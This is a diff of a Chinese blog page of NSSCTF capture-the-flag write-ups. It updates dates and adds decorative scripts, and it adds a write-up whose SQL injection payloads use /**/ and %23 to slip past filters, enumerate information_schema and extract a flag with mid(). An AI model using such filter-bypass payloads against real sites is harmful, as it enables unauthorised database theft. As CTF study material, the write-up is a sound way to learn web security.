@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://fru1ts.github.io/2023/01/04/NSSCTFwp/binwalk.png">
 <meta property="og:image" content="https://fru1ts.github.io/2023/01/04/NSSCTFwp/morse.png">
 <meta property="article:published_time" content="2023-01-04T02:15:04.000Z">
-<meta property="article:modified_time" content="2023-01-11T08:37:28.262Z">
+<meta property="article:modified_time" content="2023-01-12T04:10:35.614Z">
 <meta property="article:author" content="fru1ts">
 <meta property="article:tag" content="CTF,WP">
 <meta name="twitter:card" content="summary_large_image">
@@ -68,6 +68,11 @@
     <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
+
+
+  
+<link rel="stylesheet" href="/css/mouse.css">
+<link rel="stylesheet" href="/css/scroll.css">
 
 
 
@@ -242,7 +247,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.6k 字
+          3.5k 字
         
       </span>
     
@@ -253,7 +258,7 @@
         
         
         
-          22 分钟
+          30 分钟
         
       </span>
     
@@ -304,7 +309,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年1月11日 下午
+                    本文最后更新于：2023年1月12日 中午
                   
                 
               </p>
@@ -341,6 +346,9 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;a&quot;</span>==<span class="hljs-literal">true</span>)  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;a&quot;</span>==<span class="hljs-literal">false</span>)  <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-meta">?&gt;</span>  <br><br></code></pre></td></tr></table></figure>
 
 <p><code>NSSCTF&#123;881620fb-c01a-4eda-bbfa-baef4a333f9e&#125;</code></p>
+<h3 id="SWPUCTF-2021-新生赛-sql"><a href="#SWPUCTF-2021-新生赛-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]sql"></a>[SWPUCTF 2021 新生赛]sql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">过滤注释符，用%23替代<br>过滤空格，用/**/替代<br>?wllm=1&#x27;/**/order/**/by/**/3%23   #3列<br>?wllm=0&#x27;/**/union/**/select/**/1,2,database()%23   #test_db<br>过滤等号,用like替代<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23 #LTLT_flag,users<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&#x27;LTLT_flag&#x27;%23  #id,flag<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(flag)/**/from/**/LTLT_flag%23   #NSSCTF&#123;b0c390d7-ca62<br>group_concat只回显20个字符，使用right,REVERSE,substr被过滤，使用mid替代<br>?wllm=0&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),21,20)/**/from/**/LTLT_flag%23 #-4071-9468-bb0808163<br>?wllm=0&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),41,20)/**/from/**/LTLT_flag%23  #493&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>NSSCTF&#123;b0c390d7-ca62-4071-9468-bb0808163493&#125;</code></p>
 <h3 id="SWPU-2019-神奇的二维码"><a href="#SWPU-2019-神奇的二维码" class="headerlink" title="[SWPU 2019]神奇的二维码"></a>[SWPU 2019]神奇的二维码</h3><p>附件是一张二维码</p>
 <img src="/2023/01/04/NSSCTFwp/MISC-%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81-BitcoinPay.png" srcset="/img/loading.gif" lazyload class="">
 
@@ -612,7 +620,7 @@
     <div class="footer-inner">
   
     <div class="footer-content">
-       <a href="https://fru1ts.github.io" target="_self" rel="nofollow noopener"><span>fru1ts</span></a>
+       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="js/duration.js"></script> </div> 
     </div>
   
   
@@ -833,6 +841,12 @@
   <script  src="/js/local-search.js" ></script>
 
 
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/star.js"></script>
+<script src="/js/love.js"></script>
 
 
 
